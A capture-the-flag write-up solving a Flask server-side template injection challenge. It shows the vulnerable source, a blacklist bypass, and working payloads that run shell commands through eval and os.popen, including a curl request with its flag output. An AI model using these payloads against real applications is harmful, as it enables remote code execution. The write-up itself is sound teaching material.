>Curl as a Service is old, welcome to Certificate as a Service! Note: flag is in `flag.txt` Author: NoobMaster

I was not able to solve this on my own, but thanks to [onsra03](https://github.com/onsra03/WU-n00bz-CTF-2023/blob/main/README.md#caas) for the fantastic writeup post-CTF.

-------------------------------------

### Source code
```python
#!/usr/bin/env python3
from flask import Flask, request, render_template, render_template_string, redirect
import subprocess
import urllib

app = Flask(__name__)

def blacklist(inp):
    blacklist = ['mro','url','join','attr','dict','()','init','import','os','system','lipsum','current_app','globals','subclasses','|','getitem','popen','read','ls','flag.txt','cycler','[]','0','1','2','3','4','5','6','7','8','9','=','+',':','update','config','self','class','%','#']
    for b in blacklist:
        if b in inp:
            return "Blacklisted word!"
    if len(inp) <= 70:
        return inp
    if len(inp) > 70:
        return "Input too long!"

@app.route('/')
def main():
    return redirect('/generate')

@app.route('/generate',methods=['GET','POST'])
def generate_certificate():
    if request.method == 'GET':
        return render_template('generate_certificate.html')
    elif request.method == 'POST':
        name = blacklist(request.values['name'])
        teamname = request.values['team_name']
        return render_template_string(f'<p>Haha! No certificate for {name}</p>')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=52130)
```

Reviewing the source code, we can get an idea on what kind of exploit is involved just by looking at the type of strings blacklisted. These are common python functions, suggesting a python code injection. Exploring where our input is used, we have this line:
```python
render_template_string(f'<p>Haha! No certificate for {name}</p>')
```
A very quick google search suggests this might be SSTI, which is reasonable to believe based on the blacklist. We must utilize SSTI to display the contents of `flag.txt`. Among the commonly used SSTI functions present within the blacklist, we even see `flag.txt` is among them. 

### Bypassing blacklist
It is clear that this blacklist must be bypassed. One possible approach is to use quotations to break string sequences. Onsra03 proposes `{{namespace['__ini''t__']['__global''s__']['o''s']['pop''en']('l\s')['rea''d'](+)}}`. However, with this we quickly approach the 70 char limit.

From the source code it is worth pointing out that only the parameter `name` is checked for blacklisted characters. If we can supply blacklisted characters in `team_name`-- or perhaps an unused parameter--then call `team_name` again within `name`, we should be able to pass the blacklisted characters to execute.

### Building payload

Using global variable `g`, we can generate a much smaller payload from `namespace[__ini''t__]`. Secondly, we can utilize `request.form` to reference a different supplied parameter containing banned strings. At this point, our payload is small enough that referencing `team_name` is still within the length requirements. However, we could make the name parameter even smaller by referencing some single letter parameter such as `a`:
```
name={{g.pop['__global''s__'].__builtins__.eval(request.form.team_name)}}&team_name=__import__('os').popen('cat flag.txt').read()
```
Supplying this as the post request body:
```bash
curl -X POST http://challs.n00bzunit3d.xyz:52130/generate -d "name={{g.pop['__global''s__'].__builtins__.eval(request.form.team_name)}}&team_name=__import__('os').popen('cat flag.txt').read()"
<p>Haha! No certificate for n00bz{5571_57r1k3s_4g41n_7a1b3f4e5d}</p>
```
#### Alternative payload
Another interesting approach does not use `g.pop` but instead utilizes Flask's `get_flashed_messages` function:
```
name={{get_flashed_messages['__built''ins__'].eval(request.values['a'])}}&a=__import__('os').popen('cat flag.txt').read()&team_name=b
```
Note that in this situation referencing `team_name` in request.values will exceed the input length limit, so we utilize a single letter parameter  `a` instead. The values for `team_name` doesn't matter anymore, so it's just set to b.
